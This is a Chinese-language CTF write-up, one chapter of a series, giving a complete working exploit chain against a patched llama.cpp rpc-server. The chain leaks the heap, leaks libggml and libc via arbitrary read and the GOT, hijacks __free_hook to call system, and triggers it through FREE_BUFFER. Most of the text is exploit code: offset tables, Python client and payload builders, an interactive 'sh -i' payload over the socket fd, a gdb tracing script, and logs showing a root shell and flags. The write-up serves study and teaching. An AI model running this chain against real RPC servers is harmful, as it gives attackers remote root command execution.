---
title: 利用链与 EXP
tags:
  - 实战案例
  - PWN
  - 堆利用
  - __free_hook
created: 2026-10-16
status: 已核验
order: 500
publish: true
---

原语在 [[02-读patch与漏洞原理#原语总表|原语总表]]，这一篇把它们串成完整利用链：**泄漏 → 劫持 → 触发**。

> [!info]- "利用链"和"三段式"
> 单个漏洞往往只给一个弱能力（比如只能读点内存），要把它和别的缺陷串成一串，最后落到"执行命令"，所以叫利用**链**。服务类 pwn 的通用骨架就三段：**泄漏**（把被随机化的地址问出来）→ **劫持**（把程序的控制流/数据流改到自己手里）→ **触发**（真正跑起来，并把结果拿回来）。换哪道题都是这三段，变的只是每段的手段。

## 偏移表（glibc 2.31）

全部从附件提取（`nm` / `readelf -r` / `nm -D libc.so.6`）：

| 名称 | 值 | 用途 |
|---|---|---|
| `ggml_backend_cpu_buffer_name` | `libggml+0x95590` | = `buffer+0x00`，泄漏+自检 |
| `ggml_backend_cpu_buffer_free_buffer` | `libggml+0x955f0` | = `buffer+0x08`，自检 |
| `ggml_backend_cpu_buffer_get_base` | `libggml+0x955a0` | = `buffer+0x10`，自检 |
| `free@GLIBC_2.2.5` GOT | `libggml+0x128950` | 泄漏 libc |
| `malloc@GLIBC_2.2.5` GOT | `libggml+0x128bf8` | 交叉验证 |
| `free` | `libc+0x9a6d0` | |
| `malloc` | `libc+0x9a0e0` | 交叉验证 |
| `system` | `libc+0x52290` | 劫持目标 |
| `__free_hook` | `libc+0x1eee48` | 被劫持的 hook |
| `environ` | `libc+0x1ef600` | 栈 ROP 路线用 |
| `buffer->context` | `buffer+0x50` | free 的目标 / 放命令串 |
| `buffer->size` | `buffer+0x58` | |
| `tensor->data` | `tensor+0x100` | 读的源地址 |

> [!info]- 偏移表的用法：真实地址 = 基址 + 偏移
> 开着 ASLR 时，libc 和 libggml 每次运行被加载到不同位置，但**内部结构相对开头的位置永远不变**——函数在文件里偏移 0x95590，加载后就在"基址+0x95590"。所以打题的套路永远是：先拿到一个已知符号的真实地址，减去它在文件里的偏移算出**基址**，之后任何函数的真实地址都能用表里的偏移加出来。这就是本篇偏移表唯一的用法，也是为什么前面侦察阶段要花力气确认 libc 版本（版本不同，偏移全不同）。

## 第①步：ALLOC_BUFFER 拿堆地址

```
发送: cmd=0, input = p64(0x1ff)
接收: 16 字节 = [u64 buffer句柄][u64 buffer->size]
```

实测：`buffer=0x55555e8a0260 size=0x21f`（0x1ff+0x20）。

> [!info]- 堆和 malloc 初步
> 程序的变量要么在**栈**上（函数局部变量，函数返回就没了），要么在**堆**上（`malloc` 申请、`free` 归还，想活多久活多久）。`malloc(n)` 从堆里切一块至少 n 字节的内存给你，返回指向它的**指针**——这个数字本身就是个内存地址。本题所有 buffer 结构体、context 数据块都住在堆上。
>
> [!info]- 为什么"句柄"就是堆地址
> 服务端本该发一个不透明的编号（"3 号 buffer"），它却把**自己内存里那个结构体的真实地址**直接发回来了。对它来说这无所谓——协议假设客户端和服务端是同一台机器上的同一个程序，"你手里有地址"不算泄密。对攻击者来说这是白给的堆泄漏：不用任何漏洞，发条正常命令就拿到了堆上的一个确切地址。

## 第②步：任意读，dump buffer 结构体

```python
t = make_tensor(buffer=buf_handle,          # 已被登记，通过校验
                ne=(size+16,1,1,1),         # 让 ggml_nbytes 足够大
                nb=(1,1,1,1),
                data=addr_to_read)          # ★ 真正的读地址
inp = t + p64(offset) + p64(size)           # 总长 = 0x138
resp = c.cmd(7, inp)
```

第一次读就把 `buffer` 结构体自己 dump 出来（地址在第①步已经拿到）：

```
+0x00: 0x00007ab4d4b84590      ← 像 libggml.so 里的地址
+0x08: 0x00007ab4d4b845f0
+0x10: 0x00007ab4d4b845a0
+0x18: 0x0000000000000000
+0x20: 0x00007ab4d4b84680
+0x28: 0x00007ab4d4b846a0
+0x30: 0x00007ab4d4b84ff0
+0x38: 0x00007ab4d4b84660
+0x40: 0x0000000000000000
+0x48: 0x00007ab4d4c18ba0      ← 落在 libggml 的 .data
+0x50: 0x0000555565f29030      ← 堆地址（malloc 出来的数据块）
+0x58: 0x0000000000000120      ← 大小
+0x68: 0x0000000000000021      ← 下一个 chunk 的 header，结构体到 0x68 为止
```

怎么认出哪行是 libggml 的地址、哪行是堆地址：`0x00007ab4...` 开头的都是共享库或堆的映射区（64 位 Linux 用户态地址普遍 0x7 开头），`0x00005555...` 开头的一般是主程序和它的堆。精确归属靠下一节的"两把尺子"。

`+0x00` 到底是谁？符号表给出 `ggml_backend_cpu_buffer_name = libggml+0x95590`，`/proc/pid/maps` 给出运行基址 `0x7ab4d4aef000`，相减 `0x7ab4d4b84590 - 0x7ab4d4aef000 = 0x95590`，三个 iface 指针全部对上。

EXP 里不能读 /proc，改成"自检"：

```python
libggml = u64(st, 0x00) - 0x95590
assert libggml & 0xfff == 0                                # 页对齐
assert abs(u64(st, 0x08) - (libggml + 0x955f0)) < 0x2000   # free_buffer
assert abs(u64(st, 0x10) - (libggml + 0x955a0)) < 0x2000   # get_base
```

> [!info]- 为什么敢断言"页对齐"
> 内存按**页**管理，一页 0x1000（4096）字节，任何模块的加载基址必然是 0x1000 的整数倍，换算成十六进制就是**最低三位（低 12 位）一定是 0**。`libggml & 0xfff == 0` 检查的就是这个。如果减出来的结果低 12 位不是 0，说明前面哪个偏移抄错了——一个零成本的自检。

> [!tip]- 泄漏必须交叉验证
> 永远不要只信一个地址。三个已知偏移同时成立，基址才是 100% 正确；只验一个，偏移表抄错一行你都发现不了，后面整条链全建立在错的基址上，排查起来极其痛苦。自检语句在 EXP 里就三行，永远值得写。

## 第③步：从 GOT 泄漏 libc

`libggml.so` 是 Partial RELRO，`.got.plt` 里存着已解析的 libc 地址（见 [[01-背景与静态侦察#file / checksec：版本与保护]]）：

```bash
$ readelf -r -W libggml.so | grep -E ' free@| malloc@'
0000000000128950  R_X86_64_JUMP_SLOT  0000000000000000 free@GLIBC_2.2.5 + 0
0000000000128bf8  R_X86_64_JUMP_SLOT  0000000000000000 malloc@GLIBC_2.2.5 + 0
```

```python
free_got   = c.read_u64(buf, libggml + 0x128950)
malloc_got = c.read_u64(buf, libggml + 0x128bf8)
libc = free_got - 0x9a6d0             # libc-2.31 的 free 偏移
assert libc & 0xfff == 0
assert malloc_got - libc == 0x9a0e0   # ★ 交叉验证
```

> [!info]- GOT / PLT 与懒绑定：完整走一遍
> 动态链接的程序调用 `free` 时，指令其实是 `call free@plt`。**PLT**（过程链接表）是一小段跳板代码，第一次调用时它跳去动态链接器，让链接器在 libc 里找到真正的 `free`，把找到的地址写进 **GOT**（全局偏移表）的一个格子里；之后的调用直接从 GOT 格子里取地址跳过去，不再绕路。这叫**懒绑定**（lazy binding）——用的时候才解析。
> 对攻击者的意义：GOT 是一块**内容为 libc 真实地址的、位置固定的内存**（位置=libggml 基址+0x128950， Partial RELRO 下可读）。用任意读读一个格子，就白拿一个 libc 地址。

> [!note]- free@GOT 为什么一定已解析
> 懒绑定下 GOT 项要等第一次调用才填真值。之前发的 alloc/read 等命令早就触发过 `free`，所以读到的必然是解析后的地址。如果读到 0 或很小的值，说明还没解析过，补发几条正常命令再读（脚本里做了这个检查）。

## 第④步：劫持 __free_hook

```bash
$ nm -D libc.so.6 | grep -E '__free_hook| system'
00000000001eee48 V __free_hook
0000000000052290 W system
```

> [!info]- system() 是什么
> `system("命令")` = 起一个 `/bin/sh -c "命令"` 子进程执行那行命令。它就一个参数：指向命令字符串的指针。所以"任意代码执行"可以退化成"让某次函数调用的第一个参数恰好是我们控制的字符串地址，且调用的函数是 system"——本题选的路线就是这么精确地把这两件事凑齐的。

选 hook `free` 而不是 `malloc`，是因为有一条**必然以我们控制的参数调用 free** 的现成路径：

```
FREE_BUFFER(句柄)
  → rpc_server::free_buffer        (在 buffers 集合里查一下句柄，合法)
  → ggml_backend_buffer_free(buf)
      → call *0x8(buf)             = ggml_backend_cpu_buffer_free_buffer
          → mov 0x50(%rdi),%rdi    = rdi = buf->context
          → jmp free@plt           = free(context)
              → __free_hook(context) = system(context)     ← 我们的字符串就是参数
```

```python
c.edit(ctx, cmd.encode() + b"\x00")            # 命令字符串写进 buffer->context
c.edit(libc + 0x1eee48, p64(libc + 0x52290))   # __free_hook = system
c.s.sendall(bytes([4]) + p64(8) + p64(buf))    # FREE_BUFFER → 触发
```

> [!important]- 选劫持点的标准
> 不是随便挑一个 hook 就能打。标准是找一条**"程序必然会执行、且参数必然是我们控制的内容"**的路径：本题里 `FREE_BUFFER` 命令我们随时能发（必然执行），`free` 的参数 `buffer->context` 是我们用任意写填过命令串的地方（参数可控）。两个条件同时满足，劫持点才算选对。候选只有一条时看它，候选很多时挑副作用最小的。
>
> [!info]- __free_hook 机制详解
> glibc 的 `free` 源码开头大意是：`if (__free_hook != NULL) return (*__free_hook)(ptr, caller);` ——先看这个全局函数指针有没有被设，设了就调用它、ptr 原样传入，**真正的释放逻辑根本不执行**。这个口子是给内存调试库（比如自己记录每次 free）留的。攻击面：`__free_hook` 就是 libc 里一个普通的可写变量，能写内存就能改它。glibc 2.34 把所有 hook 删除，这条路从此封死——但"删 hook"只是提高门槛，不是修复（见 [[05-复盘与修复#修复建议]]）。
> 命令串末尾补 `b"\x00"` 是因为 `system` 按字符串处理参数，读到 `\0` 才算完；context 原来的内容不清掉，命令就会接上一串垃圾。

其它两条路线（劫持 `iface.get_base`、栈上 ROP）的对比见 [[05-复盘与修复#其它可行路线]]。

## 第⑤步：命令串写进 context

`free()` 的参数是 `buffer->context`，命令串必须放在它指向的地方——而 `context` 的地址第②步已经从结构体 `+0x50` 读到了，闭环。

## 第⑥步：payload 容量上限

`alloc_buffer` 里是 `malloc(size + 0x20)`（汇编见 [[01-背景与静态侦察#ggml_backend_buffer：堆上的信息源]]），`size` 又被 patch 卡在 `≤ 0x1ff`，所以**能安全写入的最大长度 ≈ 0x1ff + 0x20 = 543 字节**。

> [!info]- "size + 0x20" 里的 0x20 是谁的
> 是 ggml 自己多申请的：它分配 context 时故意多要 32 字节放自己的管理数据，所以这块**合法可写范围**是 0x1ff+0x20。注意别和 glibc 内部的 chunk header 混淆——malloc 底下还有自己的簿记结构（在每块内存前面），那是 glibc 的地盘，越过去踩坏它同样会崩。

> [!warning]- 写超了会踩坏下一个 chunk（实测段错误）
> 第一次用 `alloc(0x100)`（安全区 0x120 字节）塞了 380 字节的命令串，`EDIT_BUFFER` 把后面 chunk 的 header 写坏：
>
> ```
> $ ... Segmentation fault  ./rpc-server --host 127.0.0.1 --port 50052
> ```
>
> 堆是紧挨着排的：这块的末尾就是下一块的开头，多写的字节落在**别人家的头部**。glibc 靠这些头部字段找相邻块、做合并，写坏后下一次 malloc/free 立刻崩。修复：`alloc(0x1ff)` + 脚本里加断言。
>
> ```python
> self.buf, sz = c.alloc(0x1ff)
> self.cap = 0x1ff + 0x20 - 1
> assert len(cmd) + 1 <= self.cap, "payload 超出 context 容量"
> ```

> [!tip]- 任意写也要尊重别人的边界
> 任意写原语不是万能的——写进别人分配的内存，就受别人 chunk 大小的约束。这比"堆布局没排好"更隐蔽：地址合法、长度合法，坏的是邻居家。

## 第⑦步：回显与触发

有 shell 了，怎么把输出拿回来是问题最密的地方，四个独立问题：

> [!warning]- shell 的 fd 继承自服务端，不一定是 0/1/2
> 远程是 `entrypoint → ./rpc-server` 直接监听：`0 → /dev/null`，`1/2 → log`，`3 → 监听 socket`，`4 → 与你的连接`；本地 `socat`/`xinetd` 部署则是 0/1/2 = socket。shell 是服务端 `fork` 出来的，编号原样继承（fd 概念见 [[03-协议逆向与调试环境#调试三板斧]] 的折叠说明）。通吃写法是往所有 fd 都写一遍，哪个是 socket 输出就从哪回来：
>
> ```sh
> for f in 0 1 2 3 4 5 6 7 8 9 10 11; do ( ... ) >&$f 2>/dev/null; done
> ```

> [!warning]- dash 内建 echo 的缓冲会吞掉输出
> `for f in ...; do echo "x" >&$f; done` 这种每次单独重定向的写法，实测一个字都收不到。用 accepted socket 固定在已知 fd 上的隔离程序测过各种写法：
>
> | 写法 | 客户端能收到吗 |
> |---|---|
> | `echo x >&5`（单条） | ✅ `b'MARKER-BUILTIN\n'` |
> | `for f in 3 5; do echo x >&$f; done` | ❌ `b''` |
> | `for f in 3 5; do ( echo x ) >&$f; done` | ✅ |
> | `for f in 3 5; do /bin/echo x >&$f; done` | ✅ |
> | `( echo x; id ) >&5 2>&5` | ✅ |
>
> 原因：dash 的 `echo` 是**内建命令**（不是独立程序），输出先写进 stdio 缓冲区攒着；循环里每次 `>&$f` 只影响当前这一条，缓冲区直到重定向恢复后才 flush，数据全跑到"当时碰巧是 stdout 的地方"去了。`/bin/echo` 是独立程序没这毛病，或者整条命令用组重定向/子 shell 包起来。

> [!warning]- __free_hook 是全局的：装上后每次 free 都在执行命令
> 服务端每轮循环都析构 `input`/`output` 两个 vector，每次析构都 `free`，每次 `free` 都被劫持成 `system`。于是日志里开始刷 `sh: 1: xxxx: not found`（拿被释放的内存内容当命令跑，垃圾命令，无害）；更麻烦的是，如果被释放的内存里正好是 payload 文本（比如回读校验的 output vector），它会把 payload **再执行一遍**，往 socket 乱写，冲掉 8 字节协议帧头——客户端再按协议读就会 `u64` 到天文数字直接 `MemoryError`。
>
> 所以流程必须是：**泄漏（协议干净）→ 写 payload → 写 hook（最后一条协议命令）→ 触发（只 send 不 recv）→ 裸读 socket**。

> [!warning]- 服务端单连接串行
> `start_rpc_server` 是 `accept → rpc_serve_client(循环) → close → accept ...`，第一条连接不关就不会 accept 下一条。要开第二条连接（比如交互 shell）先 `close()` 第一条。
> 另外 `buffers` 集合是按连接的（每次连接新建 `rpc_server` 对象），但 `__free_hook` 改的是 libc 全局数据——第一次利用后这个常驻进程就带着状态了，后续连接要能识别并兼容（见下面的容错设计）。

## EXP 结构：协议层容错与三段式

完整代码 `exploit_llama_rpc.py`（单文件、无第三方依赖）。

```python
class Client:
    def cmd(self, cmd, data=b"", tries=5):
        for _ in range(tries):
            self.s.sendall(bytes([cmd]) + p64(len(data)) + data)
            try:
                n = u64(recvn(self.s, 8))
                if n > 0x100000:                 # 被 shell 输出顶掉的帧头
                    raise ValueError("bogus length")
                return recvn(self.s, n) if n else b""
            except Exception:
                self._flush(); time.sleep(0.15)  # 冲掉脏数据后重放（命令幂等）
        raise RuntimeError("协议反复失败")
```

> [!tip]- 两个设计点
> **resync**：hook 装上后 socket 上可能有脏数据（上一条的 shell 输出），`_flush()` 把缓冲冲干净再重发。前提是**命令幂等**——执行两次和执行一次效果一样（读内存、分配 buffer 都是幂等的），所以重放安全。
> **"返回 false"不是异常**：它表现为连接被关、`recvn` 抛 `EOFError`——这是"命令被拒"，不是网络问题。调试阶段在 `alloc(0x200)` 上被这个误会浪费过时间。
> `n > 0x100000` 是个便宜的防御：正常响应长度都是几十到几百字节，读到天文数字说明帧头被 shell 输出顶掉了，直接当作脏数据处理。

```python
def make_tensor(type_=0, buffer=0, ne=(1,1,1,1), nb=(0,0,0,0), data=0, name=b"t", ...):
    b = bytearray(0x128)
    struct.pack_into("<I", b, 0x08, type_)       # type
    struct.pack_into("<Q", b, 0x0c, buffer)      # buffer（结构体是 packed，+0x0c 未对齐）
    for i in range(4):
        struct.pack_into("<I", b, 0x14+4*i, ne[i])
        struct.pack_into("<I", b, 0x24+4*i, nb[i])
    struct.pack_into("<Q", b, 0xdc, data)        # ★ 读地址
    b[0xe4:0xe4+len(name)+1] = name + b"\0"
    return bytes(b)
```

> [!info]- bytearray 和 pack_into
> `bytearray(0x128)` 造一块 0x128 字节、内容全零的可变缓冲——正好是一张"全 0 的 rpc_tensor"，没填的字段自动是 0，而协议里没用的字段（flags/view_src 等）恰好就该是 0。`struct.pack_into(格式, 缓冲, 偏移, 值)` 把整数按格式写进缓冲的指定偏移：`<I` 小端 4 字节、`<Q` 小端 8 字节。对照第 3 篇的字段偏移表逐行填，就是"按表填空"。

> [!tip]- ne/nb 的填法
> `ggml_nbytes()` 必须 ≥ `offset+size`，否则 `ggml_backend_tensor_get` 的 `cmp %rax,%r15 / ja abort` 会拦下请求。`ne[0]` 拉大、`nb[0]` 设 1，`nbytes = type_size + (ne[0]-1)*nb[0]` 就够。

主流程三段：

```python
def leak(self):
    buf, sz = c.alloc(0x1ff)                       # ① 堆 + payload 空间
    st  = c.read_mem(buf, buf, 0x80)               # ② 任意读结构体
    self.libggml = u64(st,0x00) - 0x95590
    self.ctx     = u64(st,0x50)
    ... 三处自检 ...
    self.libc = c.read_u64(buf, self.libggml + 0x128950) - 0x9a6d0   # ③ libc
    ... malloc@GOT 交叉验证 ...
    self.system = self.libc + 0x52290
    self.hook   = self.libc + 0x1eee48

def stage(self, cmd):
    c.edit(self.ctx, cmd.encode() + b"\x00")       # ④ 命令写进 context
    c.edit(self.hook, p64(self.system))            #    劫持 free —— 最后一条协议命令
def trigger(self):
    self.c.s.sendall(bytes([4]) + p64(8) + p64(self.buf))   # ⑤ 只发不读
def drain(self, secs):  ...                        # ⑥ 裸读 socket，正则抓 flag
```

常驻服务要能连打，两个容错：

```python
# (1) 先看 hook 是否已被上一次利用装上
cur = c.read_u64(self.buf, self.hook)
self.hook_preset = (cur == self.system)

# (2) hook 已装就别做"payload 回读校验"——那会把 payload 文本读进
#     output vector，free 时又被当命令执行一遍（自己打自己）
verify = not self.hook_preset
```

实测同一服务端连打 3 次全部成功：

```
########## run 1 ##########  [*] FLAG >> flag{repeat_run_ok}
########## run 2 ##########  [*] FLAG >> flag{repeat_run_ok}
########## run 3 ##########  [*] FLAG >> flag{repeat_run_ok}
```

交互 shell（fd 由探测阶段得到，远程是 4）：

```python
e2.stage(f"sh -i <&{fd} >&{fd} 2>&{fd}")
e2.trigger()
# 本机 stdin 转发过去，socket 收到的写出来
```

```
sh: 0: can't access tty; job control turned off
$ id
uid=0(root) gid=0(root) groups=0(root)
$ cat /flag
flag{36f61386-5d91-497e-ae78-76fc5e9bbde8}
```

> [!info]- `sh -i <&4 >&4 2>&4` 这行命令在干什么
> `<&4` = 把 4 号 fd 复制成标准输入；`>&4`/`2>&4` = 标准输出、标准错误也指到 4。4 是和我们的连接，于是 shell 的输入来自 socket、输出也回 socket——远程交互就是这么来的。`-i` 是交互模式；`can't access tty` 的提示是因为 socket 不是终端，不影响用。`2>&4` 里数字顺序别写反：`2>&4` 是"2 指到 4 当前的目标"，`4>&2` 就是另一个意思了。

## gdb 打点：看着链子跑通

脚本 `assets/demo2.gdb`（printf 用英文，避免终端编码把日志写花），服务端整个跑在 gdb 里：

```gdb
set pagination off
set confirm off
set breakpoint pending on
file ./ld-linux-x86-64.so.2
set args --library-path . ./rpc-server --host 127.0.0.1 --port 50095 --mem 50

# 1) 后门命令: dst / len / data 全来自网络
break rpc_server::edit_buffer
commands
  silent
  set $vec = (char **)$rsi
  set $begin = $vec[0]
  printf "\n[edit_buffer]   input.size = %lu\n", $vec[1] - $begin
  printf "                dst  = %#lx    <-- arbitrary write target (no validation)\n", *(unsigned long *)$begin
  printf "                len  = %lu\n", *(unsigned long *)($begin + 8)
  printf "                data = %.40s\n", $begin + 16
  continue
end

# 2) 触发点: free(buffer->context)
break ggml_backend_cpu_buffer_free_buffer
commands
  silent
  printf "\n[cpu_buffer_free_buffer]  buffer = %p\n", $rdi
  printf "                          free(buffer->context) -> %p\n", *(void **)($rdi + 0x50)
  printf "                          context content = \"%.60s\"\n", *(char **)($rdi + 0x50)
  continue
end

# 3) system() 收到的就是我们的字符串
set $n = 0
break system
commands
  silent
  set $n = $n + 1
  printf "\n[system #%d]  rdi = \"%.70s\"\n", $n, (char *)$rdi
  if $n >= 5
    quit
  end
  continue
end

run
```

> [!info]- 这份 gdb 脚本逐段讲
> - `file ./ld-linux-x86-64.so.2` + `set args ...`：gdb 要跑的"程序"是链接器本体，参数照抄命令行——这样服务端整个活在 gdb 里，断点才打得进 libggml
> - `break 函数名`：按符号下断点（没 strip 的好处）。`commands ... end` 给断点挂自动动作；`silent` 关掉"命中断点"的刷屏，只留我们自己的 printf；`continue` 让程序继续跑
> - `set $vec = (char **)$rsi`：进函数时 `rdi` 是 this、`rsi` 是 input 的地址（成员函数的参数规则，见 [[02-读patch与漏洞原理#用汇编验证 patch]]）。`std::vector` 内存布局就是三个指针：`[0]` 数据开头、`[1]` 数据结尾——两者相减就是 size，`$vec[1] - $begin` 就是 `input.size()`
> - `*(unsigned long *)$begin`：把地址强制当指针解引用，gdb 语法和 C 一致
> - `printf "%.40s"`：最多打印 40 个字符（数据里可能没有 `\0`，不限长会打印到天边）
> - `break system` 里的 `$n` 计数到 5 就 `quit`：hook 装上后 free 无限触发，不设上限脚本永远停不下来
> - `gdb -q -batch -x 脚本`：batch 模式 = 执行完脚本里所有命令后自动退出，全程免交互，适合把日志重定向到文件

```bash
cd attachment
gdb -q -batch -x ../assets/demo2.gdb          # 起来后另开一个终端跑 EXP
python3 exploit_llama_rpc.py 127.0.0.1 50095
```

实测日志（`assets/gdb_chain_demo.log`，真实回显）：

```
[edit_buffer]   input.size = 334
                dst  = 0x555555568030    <-- arbitrary write target (no validation)
                len  = 318
                data = for f in 0 1 2 3 4 5 6 7 8 9 10 11; do (
[edit_buffer]   input.size = 24
                dst  = 0x7ffff7bf8e48    <-- __free_hook
                len  = 8
                data = <system 的地址字节>
[system #1]  rdi = "H...: not found"          <- hook 装上后第一个被 free 的垃圾 chunk
[cpu_buffer_free_buffer]  buffer = 0x555555568260
                          free(buffer->context) -> 0x555555568030
                          context content = "for f in 0 1 2 3 4 5 6 7 8 9 10 11; do ( echo "=== FD $f ==="
[system #2]  rdi = "for f in 0 1 2 3 4 5 6 7 8 9 10 11; do ( echo "=== FD $f ==="; cat /fl"
=== FD 1 ===
flag{gdb_demo_flag}
```

> [!example]- 这一屏是本题的"答案之眼"
> `dst=0x7ffff7bf8e48`（libc 里的 `__free_hook`）、`free(buffer->context)`、`system("for f in ...")` 三件事在同一屏连起来，整条链的证据都在这。

---
[[03-协议逆向与调试环境|← 上一篇]] · [[05-复盘与修复|下一篇：复盘与修复 →]]
